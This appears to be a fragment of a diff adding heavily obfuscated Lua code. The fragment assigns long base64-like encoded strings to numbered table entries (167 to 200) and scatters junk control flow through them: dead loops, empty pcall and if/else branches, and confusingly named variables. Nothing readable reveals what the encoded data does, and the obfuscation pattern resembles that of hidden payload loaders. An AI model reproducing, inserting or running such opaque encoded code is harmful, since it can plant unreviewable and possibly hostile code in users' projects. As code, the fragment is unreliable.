+_lGHIJKLMNOPQRST_0oabcd[167]='sv/lybz75cni0qTcu+nmzMnjvf6z372+vOCz/v3g7vPj+em54//DxM7a6ubk2L3zztrRvuW8w+6z6qDTzeXp5sDv0u7hv7z+7eW/zM3h5sPH5e252OnuxO3i6dnJ+8PZ/72928H60bn80+rBzO2+w8H56tzt5e7uw+SyoNniveWz7eDj4u28oOX6s+O45bKgv9rpweLu6e7H/bzB+Onm2ezuvsHA2L/u8tnD3Mrp58P62OD+5/jSyb/tvNHl5bLM3+C95r7556Dj+qDjx/jnxOf+vOP74O7M5eCgzOHjzv6z2eXBoNLRweDR6Mmg6b3+7+K9xNje6bm4+M3b4tLlufn57rnlv9HEvOK+8/vj0bm/6e3u4+SyxMHg7vPlvL++u96/zO3/0cnx+6C5'
+_lGHIJKLMNOPQRST_0oabcd[168]='5/np2fm75v7H5aTTx+DDud/+vcm+5On+ztjD3MP/zKDM2bzM4/7D2cTozPPo6rzm4O/lvrve7snE0b/m4fnmuf3/5cHfuLzu2frDxObqvtvnpOrj+Ojg5uW/pNPm2L657f28wbvp5dnK087c4b7D47j+vb7k7uX7xNHD7sH7s+PhoOm5x/vO2bvo6rnu0s3z4O7MzOf9vMHH5MPzzfu9uf+k0r747eDcu+7NpM3k0sntsuD+5/vM/bzlzP7h7NLm3/7q07775cm76OnjpOHm7eje6snk2dL+5frmzP3k7ebM2OX7yeXpzPHivczJ+8zD4bO+yb3SvLn83tHbwNLqzMzY5qDZu6CgpPnDybL60cG52L3c4+Tu5u/jzubu7s3Dwfi8uePj6u7D+uig'
+_lGHIJKLMNOPQRST_0oabcd[169]='oNPq5vrZ5fva2b3cxNjpzO3g7cnY6tLc/7ig8/7t5ub/4O65u+/D4//hv/v7veXz7trMw+bvvsOy+8zZ2u/D/u/kw9O++eXc/7K90eGk0czlve7+2eTg/rj40ty+5M3E7+DN89+77uXZvuXE4t7m0cDv6e7h4O+g5NK9zNn+4KDJ/737uOTNycLuv+bx++/Byfrnw+bp5ubl7NHb76TRzPP7s9nz5L7b4NKkwfv7777n+czT/N+/+/m956TN/7yg/u7m0ebqvcSk5e645N7mxPzo5rjk7b3b2fi92/ro0aDb/dLm4/nq3ODa6qDA7r3T7b3DxP/g6dnC0dLu47vS/v/yve3H+Oqg5eDD/tje57nN+rPJ56TM0f+80v6k+c256NO+oKDSw+b7vObu'
+_lGHIJKLMNOPQRST_0oabcd[170]='/eXM3OHi577i6r2g7tPvvujSpMntvujJ7bznpMrfvO7J4+bzudLm287Zvf3K0b3muODgvvP74NHk2b6k8//q7bPT5v7ZsuXm5OnpoLjsztzt/M6g7b3m/d/jvcS90s3DxO29/sTovaCg08y5wNLS5ue9pNzb/+jMudGz5r/p76S57c2k56TDue7e6dzlvujm5u/uzOjazKDO073D4unnxPLY0sn/88zEs9nS0fuzvMH66uj7uqDp+8Lpvrj7s+bE6O6/vtm8zLiy+ubbxN7Mwe+9pO77/ubbytnM++Xl6tPh/OnT7fnqzN/9zLnK3rLM7/O+oOHg77nC2eDju9nO4/Hg6NHz+uXcvv/u/f+kzdvluO7DxOi95tn+5ea6+ejZ46Dm5uXzztzD+L+g'
+while false do break end
+do IIGHIJKLMNOI_XYZabcdefghi1=_1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_ or 469 end
+_lGHIJKLMNOPQRST_0oabcd[171]='vvqk+/jv7cTA6Ob7xNjO+6DT5sHlv73l4b/m5eP6w+a+4L3c4frpvujv7dnE7tG457zl4+Wz6czfoOe5/eSg+/m47cTE2OfzztnS5uHg6cHa0unE/7LSzO/zvqDm7urJ7urR88f/78nn5L+gwNG+uaTsw+bz/s7MxO/qubL+w+bv4sz9+//o/uLT7dnz4O+47/++udv9vdzA7ublzu3RzM7e0tzb4urTv9nM873SvsH5oLy5yePn86T7pOPA77++ztLg7sn56Pvz5b3twtPm7e2y7czg2erZ5NrqzNnz6czK6ejM373l3MPjve754eWgv++8+7vev9Hhs9Hb4f2/2f//v+685c3z4tPgybz9vNHvvNG5xOjp87PRzNvC6eq+8/+/7uDtvcS45LLb'
+_lGHIJKLMNOPQRST_0oabcd[172]='5u3RxPLRzO7N/bzJ//jO+77gvsOg7+fJ5t7p5tn9vr786L3R2f7S2dvivKDk2s7M+7zSyeP44OOg09Gg8+zq89nz576k5czRoNLRwdn50cHY2ur+5+SkoPPg5aC/7dHB+OrO7vjpvsP74L+g/6TloM350bnH5b3j5eDM5b3q6szY7uagyeG9wcf60cPK2MO5w/nl7sfs6b75/bzM77zt4+W8ztn67r/M+tK+vsnjw7m73rPmw+zqub/p6ea/0aDZyt+95sTTvsn74r3j2u7pycP7zqDv4OrD7eC9/ebt0u6+4O+57f2//vv+zqDA7b7J+7K+zOX7v9n5u8Pz7/zNuNv7zNz82c7c8eTu5vLS6dG93qTM5+Dmw9/h5uXhs73D+/jp/vH6ztz95bzM'
+_lGHIJKLMNOPQRST_0oabcd[173]='/tnMyd+yw8zO3qTuwfvN8/nszNu+4Onm++TooLjgzMO72b/+4b/Nwb/vzMy8473BytHq2djT5f7tuL2+uOC8oMDo0cH9+NL+zeCyzNvkpMz40em5vPvO7sf66snD4M7uwu+8ueDt6sTx5b7B/f7loOf56sP5oODM8u7mvuf4zNvC3uDm4b/noKTjw7nh+M3zve+84/m/5v7H7Om52/3q/c7t6cTD5ejcweDq+6TlvqTfverD6NPNoM3koKDl4umg/f3M5tn67bn74OegzOnl5tjZ5dHZ+eD77f/Nvt+y58zfpODu+ujnzLnq5rnB/dLm8+Pl++Oyw/Oy/uXu2+TSoLjl6f7A3r65uv3O47L64Mzm6enRyf3p7rrgzuPa7+7R7Oi/4+W858TZ++r9'
+_lGHIJKLMNOPQRST_0oabcd[174]='/fq9+7j75u3o0uXz//rquPn4vfvH/9HJ+Nrp88n6zNu97+bE8frooLjizczl5b6k47jR8837stvtvOeg4t7u2/nl7ri64b7BvdLo3OPl5sHY2efb7+Lm5djq77ji2Oe4++LD8/Pi56DK3rPm4fG80f7p5ebx/eDZ7tOkxOjvv77t+9LJ4+Tm88nk7eP54b/j3+K9xKT95vPt+ebzsvu83O/l5uak4s2g2bLnwb/vv/7t4L3j8f3O+7r45tv80umg+fq80f39zNn46s7+7NLS7rz67cS85c77udPu/ue/7sSg0u6g8/3M8+Xk5sO/6OCg37vn28f75u7j+MzzoNHlubr7zPPD4NHDzurNuN/4zuPnv+XRx/jS7szqsrnv7Mzm+/Lm+87Sstv5vO25'
+_lGHIJKLMNOPQRST_0oabcd[175]='7u/u/tmyw7ntvurluvvnxOfgs+a8+b2+ud/noOjSpKDM78774frl0/LuzcHjvOfJ5/jDoP+96rni07++4tLS7ue96cTz+cPz2fHm0aDt5ublvrzu//7l2djevr7o2M7u3/nRoPrq7ub7u+W56O/RoLnR5cTu3uj78tHD0+2+vqDH5Onc5b3Rvvre5dHM6tHb5eS/yeTY0tHD/enuu9K9/fv+zMnK0czcuuK9xNmg6cHN5aD+2eW80d+k5sTj/b2+zfvqzPvz0cP87+rD4/+/4/Hk7ebs0erZu+nRxOLSvqS64+rt/NHM/uTv4Pu76OC+8fnMyeTq6L7K3ua4vPu8+8Pkvdy8/c2gyeDq/rz45rn9+e7M2tGyvvPiveXJ/uXuv9jMucPg576448PJ'
+_lGHIJKLMNOPQRST_0oabcd[176]='yt7l8+H+zcm4++nB+7Ll7uWzv9z47+Xj4bigyeXivr7t4+XMu+3M5uDezr653sPcu9Hl87jj6cnh/+7J2NnDxPHj0uP+2erm5OqguPjfv6C6u+Dj5Nnnvuje577l4MPZx/uzoLr8zvvl+8y4+eXg0aDo6qDl5O/BvPrpvvny4O7o7dL74+PNoMTpvObnvL3M2b/pxLr80uO44O3j8unRxPP5ztzK08zmvOTo0b7/vsnK3u3Bzfru27L5zsnZu++4wtLNw9m86O7tvcz+2/jmzLnS7ePlv9LR4+Dm2d/65dzfsuXJwO3Rw/3jvOPD/szl+/ntwb777tzn5Ojc8eTMw8H+vqDz+sPEx/jl5uf86vP63ubR7b/nuLvRzbnb5b/+5/PMxMDY6tHl+dLZ'
+_lGHIJKLMNOPQRST_0oabcd[177]='s+/R8/LT5sOy+7/R8fi//rj95cHf/8P7x+G/0efzvsO70+2+4um/49jSs+bK7uek/6S8xPrYv6D66L3z4aDMwbzkvMHu083E2+XM5b3p6dzJ4sz7w//NuN/jvMyg3rKg2tG+ufjqvea65bPM+tLp8+Tv4OPl4NLR++Xt+/nj5fvn5Obl7Oq94+X9zO3n5e7u++LO++bp5vP/+uD76Nm82frT7e7j5bLEv9K85v/jzMT5oM7c5O+807PqstvB++n+4+Xu47PZ5uW72b244+K92+Hg6v360aS5suW/oNm95cTZ/ebZ5fvvuL/Ts9HM3uq++b/quejov8n66L3j7/u909rS0tz/89HDw+O9yeDToMO++7Lbw+SkxP/g5ubl/eXJx+Pm89n/zMzx4uXm'
+_lGHIJKLMNOPQRST_0oabcd[178]='vP2+oNrS0tH7pOfbve3l5v/g0cno6eDcv9rq0b3p77ja2efM7frM++3l7ty90b6kvdHp7tv9vcGk/rzJwNGg0+e84Pu++MPT+fK/0eLt6ePhs82g7NHl7t+87dO77r7Ev+rD89/yzcz62urJu+q9+77j6v26v+nZ5f+8+/jYw77n48z+yf/S5srS7dm4+87R+by+uL7j6uPZ/+b9ztnlvqTl5sH40u7Z46S9vsPj6uXZ+NKg/tKypLL65ebu6uWgv+nS++XxvvPo6u/B+uq80cn/7cTo7c3Jyfvtydm8zO375NHE4+Tn8+/+ztzx5KTmuri8+8zpvPPZ5M7m7bjmxP367uXB4b/+6OjO3KDezsnZvu3++ujM7dvi6dm64MPM4bzqoNn6vNnZv+XE'
+_lGHIJKLMNOPQRST_0oabcd[179]='wt6k/ujf56Tv877D2f7l/t+76qD60qS5uOzOoODp5rm+5NHb2Onnyfnz0cPhvrPuuuTmweDSoP794sPZverpzOWg6tvts73Rx/rp2cHloNPD+ubt+tm/3L3tveXt+urtxO7nwefzzMS/7rz+4fG+we3/zcHjvszt5fK9/cPgvr7v5bzB+bzg/qDvvMyk4b++5/rO7uHs6ePb+77z5ePp0b/uzNPh5aTEzO3g0cPhvMHvoMzEyf28yeHz0dvu07Kg/Onl3OLe5v7f/s3z+Om907LgvL7u7dK++ePM8+P/0dug6b/c/tHq2bPSvcTh8b3t2/3m5f7Y5eb7/+bEv+3n2/uk5uay/77MxNK87uPg0vv9/73bue/npL/R5dz58+rl4u/txObv7cno6qD+'
+_lGHIJKLMNOPQRST_0oabcd[180]='v9PNw+W+59u/2Or95+HnwcrZ0r7noL3cztK8ucf6oP7o7r/j+/Pm3PLu5vPa0e/Bs9O/vvnx5dPH4sztverSzPny0cHZ5e2g/u7RpP3lpMzh5eag5fLnyfLoveP47+7J/u7mvsn+vqS52ercs+q8/vu/5rnE3u7zvv7S5u/i58Pn5en72/jm0+Lq5tvl4bzZ8eTS5u29oMPD/s3Jx+Wgufn6pMm57+rmpPi+ubL57u3+2OXB7aTO2fPj0fPZ8+bMudHl/rnew6C65c7c+eTuud/+w9H66e6+pOC+yfvy56Dx+8y5s9jqzMTaw8nv++7B7unD4/+8zbjK3ufJ8+LO2dvl7vPk09Lu5+Dq5uDv7f7h7On7wurN86Dp6fPl/ebB77vq48Lv0tHjoL6+'
+do _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_=LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ or 42 end
+pcall(function()end)
+if IIGHIJKLMNOI_XYZabcdefghi1~=LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ then else end
+do _1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx=17 end
+_lGHIJKLMNOPQRST_0oabcd[181]='vdi8ufu96sH/ss3b2fuzyePz0u758b7z37/uw9jvzaDlu+eg2fvNpNm7w9Hlu+rZ4eTg47744Nz78r7Euv+/zLno6sT/4KDBvdLpye+z6ub82L/j2eDl2eTf5779+unJsuTo/srS0tntoObE37jvyfPs0aTb5b2g+NPD47rl7ub7s8Pz5/G9xKDa6sP83u7b/NLMuee96NG++eDRzeXM5v7qzKDZvqDl577m0cLtv76g0sPj7bi9w7PR4Nzv/erZ+fPl2cHs6sGz7r7E7O7muejv0tnl+tLc7/O+w/u957i53r24/+W9uKDY0dvz/dG+4/vm5cfi6tzk0r3j5f7p09/gzcG84Orl+/zM/f355uX42s3D8eLM/ezo0tG72b6+pOS+w8H56sO6vby+'
+_lGHIJKLMNOPQRST_0oabcd[182]='8unNyb3YvcGg6u7m4/3SycP95cnvvu3MuP3NoLqkveXh/MPR3/3poKTg7e7jvubzuPu+wfv578P94ubm4NHOvvv458Oy4+rz/+Dp+6DpzO7y6tLZ7bvNoMzR5ubl+c7+2eCg87/v56DH+On736S9oPnl5cyk4ubD8eC/48DZ5r7y6OXBoO7l2cn6zObhvu3JvPru47L6vNnu6uXz6NG8udjt6qDE6ebJve/Ruf++6u3E2OnZ7f28uc7ZvLnn+u7ZoNjlzNmgw/v+6ejZs+3g2eH/7dH/vaTR4tPOyeW+zOX9/sPE37zq/rr70tnlvu7Bw+DDxPro6tHD/s7J/76z/uXg0tnZpM2+s+3RycngvqC6pOXBw+PMoOezw9nf/MzBxNPlwbr4zObjvrLb'
+_lGHIJKLMNOPQRST_0oabcd[183]='77uzoLnqvcS+4NHM2+K/2eH9zLn5/7/uur3OyeP55vP43u795tPpwbPSzMza6qDDx/jM5fH7zLnB5dHM7b/Svvu+5rni7+n73/7NuOPjw/780szlwNrMwfre6dzv7M7+/ePRue+z5cHh4tHB2b3vvvu4w9Phss3zv9nM5bryvcHjoMzM4+XRw+bSsszz5eWgurK+w7nTzNH87bygur+zoOG85szz5e3E7/jlueTRzMT5/NLZ8t/g/qDfv/79+73+s9rM5vu7oPPf/76g+7i+2+f/vcPi0eDZ/+S8vr/oveXH+7P7/ujm/u+76O7g7sy57frn8/mg4MzH++Du7Oq92e7v7rnv5KTBwuqg7aDZ5dHz5LPc2eSg2eTS79vz4uek//+/yf36zua/2L7M'
+_lGHIJKLMNOPQRST_0oabcd[184]='pPvm0/jRvsnx/+n75/m+ye/k78HN477z7+PDxMnivdn78r/uv9LS/rj55fP80+bMpODnvr3Zzu75/87Rv9/g+8n55r7h/8zB/O680/mk6uW77erJ4b287r/q5uP/5KDD7/qgueW85u7N47/m2fnDxOf90ub/8eXT/fnp3Ojfv9zvvMz74N7q/vmyv+bO7b/u5uqz4+O9oKDl8r6gw+Lg7r757bnfv+e47+O90/ra6ebM0czm7+Tm3Nrew9nnuOnJ2bzSyczSw/O6/+ig+eTD+9/y6v7A0szMzuntybnY5bm++MPmve7D3Ozf5dmg7ufz5trq3OTR5cz+0qTZ/fntwbrkpNzvu7z72NPu5szq7cyk5Lz+7/rt7qT7pLm53uXc4bO9waDp7cHj+s7+'
+_lGHIJKLMNOPQRST_0oabcd[185]='uOTn2+Pl6snC7+77+bLmvtn/7dnj8szlvPvm2+je58Ht/73j+f/l3KDtzPP7oL3l472g2fzSv/7B/+nu4aS87tm+vqTh/M6gx+Wg3MDuvsz7/r3Bwfvqwfv7zP7a07/Jwf/NycHj6uOy4L24x+C9uOP+6tHjvejJ4NHSyd+40vvB5LK44Ojl7ufx5dHZ4+Xu7/Pp7r3v0tH5/dHDzfjNw+TR7cn40unMyt/m5bnT56S64On74fug/u+84Pvn5cy+xNKy88DZzNzC7dL+/ujlyfLY5dn7+cPz4/zpvsTq4KCg0ebE5ezM7u+75vPg2M2+/NHpzPu+vrm6vMzM5eXloMrp58zl8r/m/NOyuMLRzuP86Ob93/nque/6vOak/82kzfjgzMP5zb7E7em5'
+_lGHIJKLMNOPQRST_0oabcd[186]='7eDRyb744NnC6czBzfrS7vn6ztzD4NLm+tnS2cDpzNHlv+r95NnMzO/s6szs0+nu/t6g5vHgw+b7oL/Z7b6z4+DRw8my4MzZ7eK/vvzuv9yk/8PZ8+Hlyfv/58nJ4szZ4O7p06Tjzbnx/+XJ4/nqweLv0qCy4b7Msv7nwe3xvNHj88zZzfnm/eLvvf7Z+8OgzeG//sre58O/0b3zyeLmw/njvb6+4r3z3/O/vuP6vbm96NLZwt/moNv4v77Y78PZsvro7uX66ub/87/M2NPDuc344NzC3r/Zs+3O2ePizOa84NG5w+PR88H50cTjvOrM+NnMvrPu5/Py2b2+4NG8vv/ksr7C0+rZ4u682fzozsz74rzc3/jpwfP+zb7lv8zT+uqz++jp6cm+5ea+'
+_lGHIJKLMNOPQRST_0oabcd[187]='/fnM87r6ssnK0ee++buy8+Pkw+PB+qTTvPm/zM7u5cza6s7J7N7Nuc7ov/7hs7/MxNrp0bzs6tu57eCg6O3M8+DT0r7z4NG55b7noOzY6smy/8zl//jM/b/RzNPv/enE7+TDyfzT6dnh8r/+zeHl++e7oMzD+M7mzNHOvtn64Myy4+rtw+Xm2cP/w8Hv+czzztHMxOH6vvPf+qSgzuqz/s7tzObH+8zc+f/S2dn95fvK3rPc//jmybj9zszz/72+xNLM08H90czfoL3B7fPnvsnszOPi073buuXn28rq6f6y+ei+8t7Oyfv4577Z4uDMpPvDvsflvdzN4uru+b3D0bz6oP264b/c4/m9ycrqoNGy7Or7uenq7fPkvrjO7+Du7f3p++be5tvs2b39'
+_lGHIJKLMNOPQRST_0oabcd[188]='wu7mwfP6zcS4/b6kztHg0dn45tz548zcw+W92+jZvb7Y37+gsvrS3Nn/0aCz0ei+4urM3L7hv9zO2Oqgzu3pzPm9oMzf/73b2fnm++X46cS6vermv+jp8/zuzLj+6uX75tjO2eDf5r7x+OX+udrp2ef54Ob7+unZ/tLpycDp7/Pjssy+vOTO0e/5zNPE7bzmvOC8udn/7czE6qD7pP682fzqw8nf4eb9/fjS3L76w/PjpNL+7u6+uMn6vrjluOfJpOPq3MzRvf3v5c3M//2+2+Tv0cnZv8z+//G9uf37vsna3uD+2eTq5eXgvr7N+enB3+TpxOzY4OP63qDJudjDwb79w+795c7u7/Lgyezpvcn/8ebEzOrR2+365fPz+b3+2b7NvuDYzNPB4r++'
+_lGHIJKLMNOPQRST_0oabcd[189]='+fvpwcLvzcz54ODc2tjg5tvjv+7E3uXMzNnO7v/67v6++83DztPo0drZ5tG4++7R8fi/46T/7cG65c2gwu3lvrz4vczs3r/M5fvOoOeyw9HM2dG+2tHovrPpzMTv5NHb2/68wbvqzMnZvOnZ+u7p2aTgvKCy+6DB4Orvucrvv+6g7b7b47/p4+W9veX5surT4/zq/f+k6uO92L39wNm908TozOXn5L3747zvwcLt5bm6vM3B+bu8ud/xvdmy+86gwtLS/u2y5f7A3tHM4urt+7nZ6syg08Pmu+/tubLg6rnlsszEyeG9zMDTpKDh+szu2f2+w+G47b782Oa57eW82eTev/644tHJ/f/oyf++57n74+fDyeK//t/9zOXZvsPB7tnl5tvlvMHu2bzE'
+_lGHIJKLMNOPQRST_0oabcd[190]='vvm88/vhv7757Oq46N6/ybLj0cy96Mzz2tOz++Pl6Mn9+szjueq9+/u94L7Y07/c4frp077g0tHC087c/tnquPrS6uWk4urb5/7M7fn/6ebt8eDM3/28vvP9vMG76ODm/+XuvvH75ebi0u/J7b/ovsTe6sTD+764yfvM5rnvvNyy++6g47K848rovvPu2erboN7uwcfkzMHD5LK5+bi93NjZvdP75O3j/tPtudnj4Oba2L7M5f3m++Pj0aDZ+bz7++DlxOLY6u3vuODczOq8++HkzaT+7s7+5+zpuef80tnB4L/Z2fvmye2/6cn5vqDJuP/M4+bpvf7m3sPu4/nOvubp6tnY77zB5/vD/rzl6czvpLzZzu6/zOP96vvE6M6g/tLNybnY0dv4087Z'
+while false do break end
+do LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ=59 end
+if _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_~=IIGHIJKLMNOI_XYZabcdefghi1 then else end
+_lGHIJKLMNOPQRST_0oabcd[191]='8tGkybr9vrn46L/ZuuCkyb7k78PE6tGg7NnqzMn5w+7x5b3Zwf2+vvm9vdzb+rP7sv29/sHi0uak+dLuuPrM8/ni6b7N++rZ+/O+uNjY6qDj/8OgzOm8zLji6dHD5LPm4Nrq7rzks+7/+9HMsuPM87no0ubB5c6g2uq8/s7e6tvH/unz4OjS/sHk5qCg7c6gzfqk3PLpv/653u2g7/3Rw7/RzO3ZoLzZ4+Hm0eDSoNPA6Mzc2O295e/jvfPJ+Or+8eXquOX/7bn/++nB+bPquL7/zOb7v+fM6OnS2cLRw9nB+8zjvdm+ufPk7cn5+Or7v+3q5e+k0v740tLupP3M/vLow9m/6uD+/+HnwfLqssnx/en7/tnm2+P66Mng6Orc2fLp7v+gv8zi6urE'
+_lGHIJKLMNOPQRST_0oabcd[192]='7eG9+7Po58O737/j2NjRzKT+6cyg0u7uztjMvvLtv8yk++Dm5f3SoPLu6ubj4+ncyeDRw+3hv8yy5dK+2urlye3koMTJ+b3Z477lzPjqzr7O0s7J+N7N28TZ6b7J4LK+2O/RuKTj4Nm45L2g7NPDzPngzMmk+Mzc5+TNvszT5vug6e/M7t7pufv5vb7O2eag7trRoNmyw+ba0ubB4b3q8+LR6dG6+ea4pOG82bvo6dnv+OnB7+Xl07vZ6vPb+L++x/u/7u3koKDz4OXM+bLMvv++7cH+0czE3+K+pKTs6cHk6u658u3RzLr5vtvA2enE5+DtzOPs6ePH/8zb7bPS2d+9w7n74MzZ/+Tpyc7Zv9nj++n78+zRuejY5dnv477M8frqzM7Z0v7D4unZ'
+_lGHIJKLMNOPQRST_0oabcd[193]='x/29ue2y0cni0by5+NO+wbnq0cHE2bzJ/O7SoODe5dz//eXE7u3p+8Lt5b7v5Omg4N7nwbqzzcS73sPZzNLO4+/+vNO56ubT5f7p+7rizszg6enm2tjOoNm8w9Hx+urjweS95v/gw8n7suagx+Hmw7vv6uO56qDlzNGgwcTvv77i0bzc7b692b76vsHz/b2+/u7D2cH54NzZs7zm4uqgvtrZzczjvby5/+LqxOG8w+7ZpMPuv9Lu4/vy0szn5L3uoOrS7uG75e7v/++45ujgydvjw9nnu+bzwurtud/s0aC6+u7D8fm/5u2458T+2c7+7fHm5eH7pMHZoM3J2/jmweGy6vOy/c7M4NjNzMPl6uXt4M6+2/nl3Mf4vaDb5KDb+eLn8/u9vbnD/enM'
+_lGHIJKLMNOPQRST_0oabcd[194]='477M0/Hg6v3ts83JwfnS0eX54MzC0b3R/NHqvszpvsTN+b/M37Lp4+Tozv6y+72g6Orp5uO/6qDu0+7zuerovrj6vdz5s8O++fuyvuG+oLm6vNLZ5N7nzO7RzMHl/8PTxNO/5v+4vczjs+nBzO3M5vrTw8zH+9Kg5eXtxMf54Mm53rK58+Sg/bvv6tnz4+Xz/OrgzPm96b7f/Orl2bLmuaDS6aDm0u+4uvzq5s35zNznv6TZ5OjNuPn5v9nN+eXcurvm5v7q6e7y07K5oN/lxP+8zKC4/tHD/eWgzObe0aDJ/9L7vP3g7uDv7ePl4KC+vd6/+77958PH4r6+w+Xn8+/4zNHb47/+zfnS+/m80bja3+e45eC+ybnR6v3jv8zj8eO90frR0v7u6b39'
+_lGHIJKLMNOPQRST_0oabcd[195]='2bjD7rPTzPv86L/+zNnloLnvv8z7vrzT2NG/2djp56D/s9LjuPjm3KDY5uXb/+bc3+DDxMngvcnn/cPm+fqg2/Hk0vvB7M2gyt6zzOLo5bnl+s244+C+oO/g7tvj8+ag2aDO2c355bnl5erj5O+9/d+/zP2537zj5bi+uO//6tPfpLzcwujM7qDvvcS4+OXJoN7q+8n+w9H66uXu7bPOybq+7vvk7r64wunm5eH77tPa2L3j8+LM4+zew8mg6u3T7u+9zNnlw6C73ujc5//S/vrY56C6uLzj2bPRw/u7zNn/+8zZ5OrRyeG7vObD4Obt/NK9oPngoPvm6sOgxN+8oLPt0r6k7MzM7tK97b3RzbnZ88PT5+PS5vzRssPO7b3JvOC+oMH+6fvz+e3T'
+_lGHIJKLMNOPQRST_0oabcd[196]='7O7mxP3kvPP40bK+2/rDud+kzdvb+OrEoO/NuO3l6dzZv7Pm2NO80/v+5/PN+c3E8+Ll+/zu6tmg0tLJx+Xqw+Ok6sHM7r/u4NHMw+7R4Pvh+tHM56Dg3Nru0czg0e7js+jlwd+zv/7hvb3B3/G9ycf55b7b4ubM8/nm7vH+4O75vMy4uerloMTo57nm7uDRoNjmuOju5dPm7r7Mwfjm+8PivcPK0ue44Nrp3OHx5fu96rzEzNOyzOHjv9z40czM5bznuejo0cPs2MzMyu7SyebTpNzj7Onc7eHm06T4vqDN7M7u2big/u/6oOa84sPm2eLM5crq6Ob+3urm2eG+oOjv5dPJ/enuveqg29/6w8HtvszJwtPp2fm+7u3f+sP75eDS5rrzw/vtvr/u'
+_lGHIJKLMNOPQRST_0oabcd[197]='wtrR2/jazcPm0+3jx//S+/ny6sza3r/R8+O9wcDu5dHv/+XE2/rM2bL5zqDo0+nBw+Pq/crYzOag0+bz57vS+/v8zP7J+dLu2tHpvsDt6uXE6Mzu2/jD89+4vcP/5OD+x+XD2eTp776g3unjuvngoOzu57n/5b3J8u3MvsDt6r7g0+e45/Lq2//gvsSy5L++3/nm5fP+5riz0aDc/ePnoLL+vcHA373b4u7M7rL45sTK7b/c4NK/5v/h56TH4ubE7NLmucTozb7M6encytrO0eLYvOa/2OXE5O3q/fvszOXt/+DZx/uz2eLezP7+0ufM8+PM/u7pzP66+Ob+/ePqufH6sqTH4O/J5b6gyfv7oOay4eXu+O7M/eG/7czy7uXBzu3m5uLSoO3n4KC+'
+_lGHIJKLMNOPQRST_0oabcd[198]='7frt3P3+vPP47+25wtHuwd/5vNHY2Ly57u7quObe6KD57On+u96+yfHi6sn5uO7M77+95uLRzu7C2M7mzO/g5v7f5f7C7uDJw/ru5ebvzv7n+ObuuqDqw/nkv+bi7+7+v9nS7vPg0cOy473J8eDtzOLY5bnh5aDEpOLmybzksr650eXM4bPS5uO7zsnB5KD+/tnmye/86tHZv+e56NHD/r3qzb7o3urZ5fK/4/vk7bnb+Oa5uODMzPu+s+bN4OigvPntyd+/0smz2Lyg+f7nyd/60sy6s+rZuqC+wczp6qDb5KD7vvjN8+f8w/7z+b3+xNHD7sLS6sz7uOXu4b3loLrxvePk6OnBoO3mw/v/v8nA6MPZwOjOye38w77H5eXmztjqvs3jw8zf4MzT'
+_lGHIJKLMNOPQRST_0oabcd[199]='7u3Rw9jS7fPfu+3B37vMxOH+vsPi2Ob+7tjR2+++vcn9/bzz4+XD5ubq7u7k06DE2aTg+8P6oLi96OD77b/q4/n96dPj8r3Rue3M++7RzNzA0unc4tHt877lvf66v73jsuS+wbvf58PO7bzT/7y80e27oP383ubuvuTNwbqk6eO72dHb/u/n88H/5rm65ebDwf7MzOP6vPP+6uDM8ePN88LZ5rj7s+X+8f7qyeTu0cT/vObMvOHnoL/SvOblveXTzeTM/fzR7rnx4O/b4NLnoOjvw7n58uW+2NO+oNm+zsn7vaTmvuK908DRvMHZvO/z2f2+uOjpvPPM2ee+zezp8+TTvaDl89L+uuPgzP3l0fO92L3joNPloL7kvMz7vuDZ76DM7ebf5sT55ebj'
+_lGHIJKLMNOPQRST_0oabcd[200]='57K9/bLl7sG56unu5/u/5u3jvObf47ygx/7S/sDS7fPD5OjM+fvO+87qvMzn476k5+Dg/s3kzbjv5ejj7/m8wcfszbjM79Gk7b3q/vn60u75vOnZ4Oro0dv658H7/cP78tHO/sLY4MnZ+ue+v9HDzL3q5vPg2s7J8+Pl2ebY4Nnu78zm+N7m7bLg7sPi6uXm2ePp887TzNv7pMzJ5NLOoPLevNPhstHDwNLO4+W76vPf4ub74b3twdjR7vPB+tLc7b+z2e/9zNz+0ui+2eDD+9jR0cHy0r6gztLu5rPRvqD7v+rcu97uzMH6oMTz4Obt7b+/5sn/w8Hh88zc++LqucHl4O75vunZsuHm2c7v4Pvg3r3b+b/qvrva6uPJ+tHB8+K90frZ5uPi6eqg'
+if _1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx~=I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno then else end
+do _1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx=LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ or 31 end
+do I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno=I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno or 89 end
+do IIGHIJKLMNOI_XYZabcdefghi1=LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ or 655 end
